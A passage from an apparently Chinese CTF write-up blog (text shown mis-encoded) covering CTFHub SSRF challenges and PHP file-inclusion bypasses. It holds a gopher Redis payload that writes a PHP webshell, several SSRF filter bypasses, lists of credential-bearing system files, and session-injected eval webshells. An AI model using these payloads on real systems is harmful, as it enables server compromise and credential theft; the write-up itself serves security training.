class="code"><pre><span class="line">-ERR Syntax error, try CLIENT (LIST | KILL | GETNAME | SETNAME | PAUSE | REPLY) +OK</span><br></pre></td></tr></table></figure></div><p>åˆ©ç”¨Gopheruså·¥å…·ç”Ÿæˆpayload</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/e6c9d24egy1h1kvax2gx5j20z80u0jzz.jpg"                      alt="image-20220424155918789"                ><figcaption>image-20220424155918789</figcaption></figure></p><p>å†ç»è¿‡ä¸€æ¬¡urlç¼–ç </p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher%3A//127.0.0.1%3A6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252434%250D%250A%250A%250A%253C%253Fphp%2520system%2528%2524_GET%255B%2527cmd%2527%255D%2529%253B%2520%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A</span><br></pre></td></tr></table></figure></div><blockquote><p>ä¼ å…¥åè™½ç„¶æ˜¾ç¤º504ï¼Œä½†å·²ç»æˆåŠŸä¼ å…¥ï¼Œç›´æ¥è®¿é—®ç½‘ç«™ä¸‹shell.phpï¼Œè™½ç„¶æœ‰ä¹±ç ï¼Œä½†å¯ä»¥é€šè¿‡shell.php?cmd&#x3D;æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤,ç”¨+ç»•è¿‡ç©ºæ ¼,é»˜è®¤äº§ç”Ÿçš„shellæ˜¯ä½¿ç”¨<code>&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;</code></p></blockquote><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-c64563873ed3afbf.sandbox.ctfhub.com:10800/shell.php?cmd=ls+/</span><br><span class="line">http://challenge-c64563873ed3afbf.sandbox.ctfhub.com:10800/shell.php?cmd=cat+/flag_a60ba40eae368b2c15d0a8e4a3a13dfd</span><br></pre></td></tr></table></figure></div><h3 id="URL-Bypass"><a href="#URL-Bypass" class="headerlink" title="URL Bypass"></a>URL Bypass</h3><p>@ç»•è¿‡</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://é¢˜ç›®è¦æ±‚åŒ…å«çš„ç½‘å€@å®é™…æƒ³è®¿é—®çš„ç½‘å€</span><br></pre></td></tr></table></figure></div><p>payload</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://notfound.ctfhub.com@127.0.0.1/flag.php</span><br></pre></td></tr></table></figure></div><h3 id="æ•°å­—IP-Bypass"><a href="#æ•°å­—IP-Bypass" class="headerlink" title="æ•°å­—IP Bypass"></a>æ•°å­—IP Bypass</h3><p>è¿›åˆ¶è½¬æ¢è„šæœ¬</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ip</span> = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>,<span class="variable">$ip</span>);</span><br><span class="line"><span class="variable">$r</span> = (<span class="variable">$ip</span>[<span class="number">0</span>] &lt;&lt; <span class="number">24</span>) | (<span class="variable">$ip</span>[<span class="number">1</span>] &lt;&lt; <span class="number">16</span>) | (<span class="variable">$ip</span>[<span class="number">2</span>] &lt;&lt; <span class="number">8</span>) | <span class="variable">$ip</span>[<span class="number">3</span>] ;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$r</span> &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="variable">$r</span> += <span class="number">4294967296</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;åè¿›åˆ¶:&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$r</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;å…«è¿›åˆ¶:&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">decoct</span>(<span class="variable">$r</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;åå…­è¿›åˆ¶:&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">dechex</span>(<span class="variable">$r</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>åˆ©ç”¨å…¶ä»–å„ç§æŒ‡å‘127.0.0.1çš„åœ°å€</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/</span><br><span class="line">http://0/</span><br><span class="line">http://[0:0:0:0:0:ffff:127.0.0.1]/</span><br><span class="line">http://â‘ â‘¡â‘¦.â“ª.â“ª.â‘ </span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Enclosed alphanumerics</span><br><span class="line">List:</span><br><span class="line">â‘  â‘¡ â‘¢ â‘£ â‘¤ â‘¥ â‘¦ â‘§ â‘¨ â‘© â‘ª â‘« â‘¬ â‘­ â‘® â‘¯ â‘° â‘± â‘² â‘³ </span><br><span class="line">â‘´ â‘µ â‘¶ â‘· â‘¸ â‘¹ â‘º â‘» â‘¼ â‘½ â‘¾ â‘¿ â’€ â’ â’‚ â’ƒ â’„ â’… â’† â’‡ </span><br><span class="line">â’ˆ â’‰ â’Š â’‹ â’Œ â’ â’ â’ â’ â’‘ â’’ â’“ â’” â’• â’– â’— â’˜ â’™ â’š â’› </span><br><span class="line">â’œ â’ â’ â’Ÿ â’  â’¡ â’¢ â’£ â’¤ â’¥ â’¦ â’§ â’¨ â’© â’ª â’« â’¬ â’­ â’® â’¯ â’° â’± â’² â’³ â’´ â’µ </span><br><span class="line">â’¶ â’· â’¸ â’¹ â’º â’» â’¼ â’½ â’¾ â’¿ â“€ â“ â“‚ â“ƒ â“„ â“… â“† â“‡ â“ˆ â“‰ â“Š â“‹ â“Œ â“ â“ â“ </span><br><span class="line">â“ â“‘ â“’ â““ â“” â“• â“– â“— â“˜ â“™ â“š â“› â“œ â“ â“ â“Ÿ â“  â“¡ â“¢ â“£ â“¤ â“¥ â“¦ â“§ â“¨ â“© </span><br><span class="line">â“ª â“« â“¬ â“­ â“® â“¯ â“° â“± â“² â“³ â“´ </span><br><span class="line">â“µ â“¶ â“· â“¸ â“¹ â“º â“» â“¼ â“½ â“¾ â“¿</span><br></pre></td></tr></table></figure></div><h3 id="302è·³è½¬-Bypass"><a href="#302è·³è½¬-Bypass" class="headerlink" title="302è·³è½¬ Bypass"></a>302è·³è½¬ Bypass</h3><p>è®¿é—®<code>http://xip.io</code>çš„å­åŸŸåï¼Œä¾‹å¦‚<code>http://192.168.0.1.xip.io</code>ï¼Œä¼šè‡ªåŠ¨é‡å®šå‘åˆ°<code>http://192.168.0.1</code></p><p>ä¸Šè¿°æ–¹æ³•åŒ…å«äº†<code>192.168.0.1</code>å†…ç½‘IPåœ°å€ï¼Œå¯èƒ½ä¼šè¢«æ­£åˆ™è¡¨è¾¾å¼è¿‡æ»¤æ‰ã€‚å¯ä»¥é€šè¿‡çŸ­åœ°å€æ–¹å¼æ¥ç»•è¿‡ã€‚<a class="link"   href="https://tinyurl.com/app" >TINYURL <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?url=http://0.xip.io/flag.php</span><br><span class="line">?url=http://localhost.xip.io/flag.php</span><br></pre></td></tr></table></figure></div><blockquote><p>127.0.0.1è¢«è¿‡æ»¤äº†ã€‚å¯ä»¥å°†127.0.0.1ç”¨<code>0</code>æˆ–<code>localhost</code>ç­‰ä»£æ›¿</p></blockquote><p>è¿™é¢˜ç”¨çŸ­é“¾æ¥æˆåŠŸè¿‡</p><p>ä½¿ç”¨<a class="link"   href="https://tinyurl.com/app/myurls" >TINYURL <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>ï¼Œåœ¨Your Long URLå¤„è¾“å…¥<code>http://127.0.0.1/flag.php</code>ï¼Œç”ŸæˆçŸ­ç½‘å€</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=https://tinyurl.com/2p8s2csr</span><br></pre></td></tr></table></figure></div><h3 id="DNSé‡ç»‘å®šBypass"><a href="#DNSé‡ç»‘å®šBypass" class="headerlink" title="DNSé‡ç»‘å®šBypass"></a>DNSé‡ç»‘å®šBypass</h3><p><a class="link"   href="https://www.freebuf.com/articles/web/135342.html" >SSRFæ¼æ´ä¸­ç»•è¿‡IPé™åˆ¶çš„å‡ ç§æ–¹æ³•æ€»ç»“ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link"   href="https://zhuanlan.zhihu.com/p/89426041" >æµ…è°ˆDNSé‡ç»‘å®šæ¼æ´ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>[åŸºäºDNSé‡ç»‘å®šçš„ç»•è¿‡](<a class="link"   href="https://github.com/incredibleindishell/SSRF_Vulnerable_Lab/tree/master/DNS" >https://github.com/incredibleindishell/SSRF_Vulnerable_Lab/tree/master/DNS <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> Rebinding based Bypass)</p><p><strong>DNS Rebinding</strong>(be likeä¸€äº›æ›¿èº«æ¢—)</p><p>åœ¨ç½‘é¡µæµè§ˆè¿‡ç¨‹ä¸­ï¼Œç”¨æˆ·åœ¨åœ°å€æ ä¸­è¾“å…¥åŒ…å«åŸŸåçš„ç½‘å€ã€‚æµè§ˆå™¨é€šè¿‡DNSæœåŠ¡å™¨å°†åŸŸåè§£æä¸ºIPåœ°å€ï¼Œç„¶åå‘å¯¹åº”çš„IPåœ°å€è¯·æ±‚èµ„æºï¼Œæœ€åå±•ç°ç»™ç”¨æˆ·ã€‚è€Œå¯¹äºåŸŸåæ‰€æœ‰è€…ï¼Œä»–å¯ä»¥<u>è®¾ç½®åŸŸåæ‰€å¯¹åº”çš„IPåœ°å€</u>ã€‚å½“ç”¨æˆ·ç¬¬ä¸€æ¬¡è®¿é—®ï¼Œè§£æåŸŸåè·å–ä¸€ä¸ªIPåœ°å€(äº‹å…ˆè®¾ç½®ä¸ºç™½åå•ä¸­çš„IPåœ°å€)ï¼›ç„¶åï¼ŒåŸŸåæŒæœ‰è€…ä¿®æ”¹å¯¹åº”çš„IPåœ°å€(æ¯”å¦‚å†…ç½‘127.0.0.1)ï¼›ç”¨æˆ·å†æ¬¡è¯·æ±‚è¯¥åŸŸåï¼Œå°±ä¼šè·å–ä¸€ä¸ªæ–°çš„IPåœ°å€ã€‚å¯¹äºæµè§ˆå™¨æ¥è¯´ï¼Œæ•´ä¸ªè¿‡ç¨‹è®¿é—®çš„éƒ½æ˜¯åŒä¸€åŸŸåï¼Œæ‰€ä»¥è®¤ä¸ºæ˜¯å®‰å…¨çš„(åŒæºç­–ç•¥)ã€‚è¿™å°±é€ æˆäº†DNS Rebindingæ”»å‡»ã€‚</p><blockquote><p>åŒæºç­–ç•¥:<strong>å¦‚æœä¸¤ä¸ªé¡µé¢çš„åè®®ï¼Œç«¯å£ï¼ˆå¦‚æœæœ‰æŒ‡å®šï¼‰å’ŒåŸŸåéƒ½ç›¸åŒï¼Œåˆ™ä¸¤ä¸ªé¡µé¢å…·æœ‰ç›¸åŒçš„æº</strong></p></blockquote><p><strong>å®ç°æ”»å‡»çš„ä¸¤ç§æ–¹æ³•ï¼š</strong></p><p>æ”»å‡»è€…å°†å­åŸŸç»‘å®šåˆ°ä¸¤ä¸ªä¸åŒçš„IPã€‚</p><p>æ”»å‡»è€…è®¾ç½®ä¸€ä¸ªDNSæœåŠ¡å™¨ï¼ŒTTLå¾ˆçŸ­ã€‚è¯¥DNSæœåŠ¡å™¨è¿”å›çš„æŒ‡å®šåŸŸåçš„è§£æç»“æœï¼Œåœ¨ä¸¤ä¸ªIPä¹‹é—´ä¸æ–­åˆ‡æ¢ã€‚</p><p>ç½‘ç«™è®¾ç½®DNSï¼š<a class="link"   href="https://lock.cmpxchg8b.com/rebinder.html" >https://lock.cmpxchg8b.com/rebinder.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>è¿™ä¸ªç½‘ç«™ä¼šéšæœºæŒ‡å‘ä¸¤ä¸ªç»‘å®šåœ°å€çš„å…¶ä¸­ä¸€ä¸ª</p><p>Payload:</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=7f000001.c0a80001.rbndr.us/flag.php</span><br></pre></td></tr></table></figure></div><p><strong>DNSè®°å½•çš„ç”Ÿå­˜æ—¶é—´ï¼ˆTTLï¼‰</strong></p><p>DNSæœåŠ¡å™¨å¦‚æœå°†TTLè®¾ç½®ä¸º0ï¼ŒWebæœåŠ¡å™¨å°±ä¸ä¼šå¯¹æŒ‡å®šåŸŸåè§£æçš„IPè¿›è¡Œç¼“å­˜ã€‚</p><p>æ­¤ç‰¹æ€§å°†æœ‰åŠ©äºç»•è¿‡ä»£ç ä¸­çš„å®‰å…¨æ£€æŸ¥ã€‚åº”ç”¨ç¨‹åºå…·æœ‰ä¸¤ä¸ªä¸åŒçš„ä»£ç éƒ¨åˆ†ï¼š</p><blockquote><p>ç¬¬ä¸€éƒ¨åˆ†ä»£ç ç”¨äºæ£€æŸ¥åŸŸ&#x2F;è¯¥åŸŸè§£æçš„IPæ˜¯å¦åœ¨é»‘åå•ä¸­ã€‚å¦‚æœåœ¨é»‘åå•ä¸­ï¼Œåˆ™åº”ç”¨ç¨‹åºå°†åœæ­¢è¿›ä¸€æ­¥å¤„ç†ã€‚</p><p>ä¸€æ—¦IP&#x2F;åŸŸé€šè¿‡äº†å®‰å…¨æ£€æŸ¥ï¼Œç¬¬äºŒéƒ¨åˆ†ä»£ç ä¼šä»æŒ‡å®šURLä¸­è·å–å†…å®¹ã€‚</p></blockquote><p>è¿™æ ·ï¼ŒWebæœåŠ¡å™¨å¯¹åŸŸåè¿›è¡Œé»‘åå•æ£€æŸ¥æ—¶ï¼Œä¼šå‘DNSæœåŠ¡å‘èµ·ç¬¬ä¸€æ¬¡è¯·æ±‚ï¼ŒDNSæœåŠ¡å™¨è¿”å›ä¸€ä¸ªåˆæ³•çš„IPåœ°å€ï¼Œç»•è¿‡äº†é»‘åå•æ£€æµ‹ã€‚å› ä¸ºDNSæœåŠ¡å™¨çš„TTLè®¾ç½®ä¸º0ï¼ŒWebæœåŠ¡å™¨ä½¿ç”¨<code>get_contents()</code>åŠ è½½æŒ‡å®šURLçš„æ–‡ä»¶å†…å®¹æ—¶ï¼Œä¼šå†æ¬¡å‘DNSæœåŠ¡å™¨è¯·æ±‚è§£æè¯¥åŸŸåï¼Œè€Œè¿™æ¬¡DNSæœåŠ¡å™¨ä¼šè¿”å›ä¸€ä¸ªå†…ç½‘åœ°å€ï¼Œä»è€ŒæˆåŠŸçš„è¯»å–å†…ç½‘æ–‡ä»¶ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ–‡ä»¶åŒ…å«</title>
      <link href="/2022/03/07/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
      <url>/2022/03/07/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<h1 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h1><h2 id="0x01-ç®€ä»‹åŠåŸºæœ¬çŸ¥è¯†"><a href="#0x01-ç®€ä»‹åŠåŸºæœ¬çŸ¥è¯†" class="headerlink" title="0x01 ç®€ä»‹åŠåŸºæœ¬çŸ¥è¯†"></a>0x01 ç®€ä»‹åŠåŸºæœ¬çŸ¥è¯†</h2><p>æ”»å‡»æ–¹ç»•è¿‡äº†æ–‡ä»¶åŒ…å«å‡½æ•°çš„å‚æ•°è¿‡æ»¤æˆ–é™åˆ¶ï¼Œä»è€ŒåŒ…å«æ¶æ„æ–‡ä»¶ï¼Œè¾¾åˆ°æ‰§è¡Œéé¢„æœŸä»£ç çš„ç›®çš„ã€‚</p><h3 id="æ–‡ä»¶åŒ…å«å‡½æ•°"><a href="#æ–‡ä»¶åŒ…å«å‡½æ•°" class="headerlink" title="æ–‡ä»¶åŒ…å«å‡½æ•°"></a>æ–‡ä»¶åŒ…å«å‡½æ•°</h3><p>PHPä¸­æ–‡ä»¶åŒ…å«å‡½æ•°æœ‰ä»¥ä¸‹å››ç§ï¼š</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span>()</span><br><span class="line"><span class="keyword">require_once</span>()</span><br><span class="line"><span class="keyword">include</span>()</span><br><span class="line"><span class="keyword">include_once</span>()</span><br></pre></td></tr></table></figure></div><blockquote><ul><li><code>include</code>å’Œ<code>require</code>åŒºåˆ«ä¸»è¦æ˜¯ï¼Œ<code>include</code>åœ¨åŒ…å«çš„è¿‡ç¨‹ä¸­å¦‚æœå‡ºç°é”™è¯¯ï¼Œä¼šæŠ›å‡ºä¸€ä¸ªè­¦å‘Šï¼Œç¨‹åºç»§ç»­æ­£å¸¸è¿è¡Œï¼›è€Œ<code>require</code>å‡½æ•°å‡ºç°é”™è¯¯çš„æ—¶å€™ï¼Œä¼šç›´æ¥æŠ¥é”™å¹¶é€€å‡ºç¨‹åºçš„æ‰§è¡Œã€‚</li><li><code>include_once()</code>ï¼Œ<code>require_once()</code>è¿™ä¸¤ä¸ªå‡½æ•°ï¼Œä¸å‰ä¸¤ä¸ªçš„ä¸åŒä¹‹å¤„åœ¨äºè¿™ä¸¤ä¸ªå‡½æ•°åªåŒ…å«ä¸€æ¬¡ï¼Œé€‚ç”¨äºåœ¨è„šæœ¬æ‰§è¡ŒæœŸé—´åŒä¸€ä¸ªæ–‡ä»¶æœ‰å¯èƒ½è¢«åŒ…æ‹¬è¶…è¿‡ä¸€æ¬¡çš„æƒ…å†µä¸‹ï¼Œä½ æƒ³ç¡®ä¿å®ƒåªè¢«åŒ…æ‹¬ä¸€æ¬¡ä»¥é¿å…å‡½æ•°é‡å®šä¹‰ï¼Œå˜é‡é‡æ–°èµ‹å€¼ç­‰é—®é¢˜ã€‚</li><li>å½“åˆ©ç”¨è¿™å››å¤§æ¼æ´å‡½æ•°åŒ…å«æ–‡ä»¶çš„æ—¶å€™ï¼Œä¸è®ºä»€ä¹ˆç±»å‹çš„æ–‡ä»¶ï¼Œéƒ½ä¼šä½œä¸ºPHPè„šæœ¬è§£æ</li></ul></blockquote><h3 id="æ•æ„Ÿä¿¡æ¯è·¯å¾„"><a href="#æ•æ„Ÿä¿¡æ¯è·¯å¾„" class="headerlink" title="æ•æ„Ÿä¿¡æ¯è·¯å¾„"></a>æ•æ„Ÿä¿¡æ¯è·¯å¾„</h3><p>Windowsç³»ç»Ÿ</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c:\boot.ini <span class="comment">// æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬</span></span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml <span class="comment">// IISé…ç½®æ–‡ä»¶</span></span><br><span class="line">c:\windows\repair\sam <span class="comment">// å­˜å‚¨Windowsç³»ç»Ÿåˆæ¬¡å®‰è£…çš„å¯†ç </span></span><br><span class="line">c:\ProgramFiles\mysql\my.ini <span class="comment">// MySQLé…ç½®</span></span><br><span class="line">c:\ProgramFiles\mysql\data\mysql\user.MYD <span class="comment">// MySQL rootå¯†ç </span></span><br><span class="line">c:\windows\php.ini <span class="comment">// php é…ç½®ä¿¡æ¯</span></span><br></pre></td></tr></table></figure></div><p>Linux&#x2F;Unixç³»ç»Ÿ</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd <span class="comment">// è´¦æˆ·ä¿¡æ¯</span></span><br><span class="line">/etc/shadow <span class="comment">// è´¦æˆ·å¯†ç æ–‡ä»¶</span></span><br><span class="line">/usr/local/app/apache2/conf/httpd.conf <span class="comment">// Apache2é»˜è®¤é…ç½®æ–‡ä»¶</span></span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhost.conf <span class="comment">// è™šæ‹Ÿç½‘ç«™é…ç½®</span></span><br><span class="line">/usr/local/app/php5/lib/php.ini <span class="comment">// PHPç›¸å…³é…ç½®</span></span><br><span class="line">/etc/httpd/conf/httpd.conf <span class="comment">// Apacheé…ç½®æ–‡ä»¶</span></span><br><span class="line">/etc/my.conf <span class="comment">// mysql é…ç½®æ–‡ä»¶</span></span><br></pre></td></tr></table></figure></div><h1 id="0x02-å¸¸è§Bypass"><a href="#0x02-å¸¸è§Bypass" class="headerlink" title="0x02 å¸¸è§Bypass"></a>0x02 å¸¸è§Bypass</h1><h2 id="sessionæ–‡ä»¶åŒ…å«æ¼æ´"><a href="#sessionæ–‡ä»¶åŒ…å«æ¼æ´" class="headerlink" title="sessionæ–‡ä»¶åŒ…å«æ¼æ´"></a>sessionæ–‡ä»¶åŒ…å«æ¼æ´</h2><h3 id="æ¡ä»¶ï¼š"><a href="#æ¡ä»¶ï¼š" class="headerlink" title="æ¡ä»¶ï¼š"></a>æ¡ä»¶ï¼š</h3><p>å¯è·å–sessionå­˜å‚¨ä½ç½®</p><h3 id="æ–¹å¼ï¼š"><a href="#æ–¹å¼ï¼š" class="headerlink" title="æ–¹å¼ï¼š"></a>æ–¹å¼ï¼š</h3><ol><li><p>phpinfoä¸­<code>session.save_path</code></p><blockquote><p>ç¬¬äºŒåˆ—æ˜¯<code>Local Value</code>ï¼ˆå±€éƒ¨å˜é‡ï¼‰ï¼Œç¬¬ä¸‰åˆ—æ˜¯<code>Master Value</code>ï¼ˆä¸»å˜é‡ï¼‰ã€‚å…¶ä¸­<code>Master Value</code>æ˜¯PHP.iniæ–‡ä»¶ä¸­çš„å†…å®¹ã€‚<code>Local value</code>æ˜¯å½“å‰ç›®å½•ä¸­çš„è®¾ç½®ï¼Œè¿™ä¸ªå€¼ä¼šè¦†ç›–<code>Master Value</code>ä¸­å¯¹åº”çš„å€¼ã€‚</p></blockquote></li><li><p>çŒœæµ‹é»˜è®¤è·¯å¾„ä»¥åŠå¸¸è§è·¯å¾„</p><ul><li>linuxä¸‹é»˜è®¤å­˜å‚¨åœ¨&#x2F;var&#x2F;lib&#x2F;php&#x2F;session</li><li><code>/var/lib/php/sess_PHPSESSID</code></li><li><code>/var/lib/php/sess_PHPSESSID</code></li><li><code>/tmp/sess_PHPSESSID</code></li><li><code>/tmp/sessions/sess_PHPSESSID</code></li></ul></li></ol><p>sessionå¯æ§</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$ctfs</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctfs&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>]=<span class="variable">$ctfs</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>sessionçš„æ–‡ä»¶åä¸ºsess_+sessionidï¼Œsessionidå¯ä»¥é€šè¿‡å¼€å‘è€…æ¨¡å¼è·å–(ä¸€èˆ¬æ˜¯cookieä¸­çš„PHPSESSIDçš„å€¼)</p><p>å•å‡»å³é”®â€”â€”æ£€æŸ¥â€”â€”å­˜å‚¨â€”â€”Cookieâ€”â€”PHPSESSID å°±å¯ä»¥æ‰¾åˆ°å†…å®¹</p><blockquote><p>å‡è®¾ä»¥ä¸Šä»£ç ä¼ å‚æ•°ctfs&#x3D;test,åˆ™sessionæ–‡ä»¶å†…å®¹ä¸º</p><p><code>username|s:4:&quot;test&quot;</code></p></blockquote><h3 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h3><p>é€šè¿‡å¯æ§å‚æ•°å†™å…¥æ¶æ„ä»£ç åˆ°sessionæ–‡ä»¶ï¼Œç„¶åé€šè¿‡æ–‡ä»¶åŒ…å«æ¼æ´æ‰§è¡Œæ­¤æ¶æ„ä»£ç getshell</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä¼ é©¬</span></span><br><span class="line">session.php?ctfs=<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//ä¹Ÿå¯ä»¥å†™é©¬</span></span><br><span class="line">session.php?ctfs=<span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;data2.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php eval($_POST[123])?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´è§£æè¯¥sessionæ–‡ä»¶</span></span><br><span class="line">file.php?file=sess_83317220159fc31cd7023422f64bea1a</span><br></pre></td></tr></table></figure></div><h3 id="æ”»å‡»æ­¥éª¤"><a href="#æ”»å‡»æ­¥éª¤" class="headerlink" title="æ”»å‡»æ­¥éª¤"></a><strong>æ”»å‡»æ­¥éª¤</strong></h3><ul><li>å°†æ¶æ„ä»£ç å†™å…¥sessionæ–‡ä»¶</li><li>æ”»å‡»è€…å¯ä»¥é€šè¿‡PHPinfoæˆ–è€…çŒœæµ‹åˆ°sessionå­˜æ”¾çš„ä½ç½®</li><li>é€šè¿‡å¼€å‘è€…æ¨¡å¼å¯ä»¥è·å¾—æ–‡ä»¶åç§°</li><li>é€šè¿‡æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´å¯ä»¥è§£æsessionæ–‡ä»¶è¾¾åˆ°æ”»å‡»çš„ç›®çš„</li></ul><h2 id="00æˆªæ–­æ–‡ä»¶åŒ…å«"><a href="#00æˆªæ–­æ–‡ä»¶åŒ…å«" class="headerlink" title="%00æˆªæ–­æ–‡ä»¶åŒ…å«"></a>%00æˆªæ–­æ–‡ä»¶åŒ…å«</h2><h3 id="æ¡ä»¶"><a href="#æ¡ä»¶" class="headerlink" title="æ¡ä»¶"></a>æ¡ä»¶</h3><ul><li>magic_quotes_gpc&#x3D;off</li><li>PHPç‰ˆæœ¬ä½äº5.3.4(5.3.29å¤ç°å¤±è´¥,5.2.17æˆåŠŸ å»ºè®®MAMP 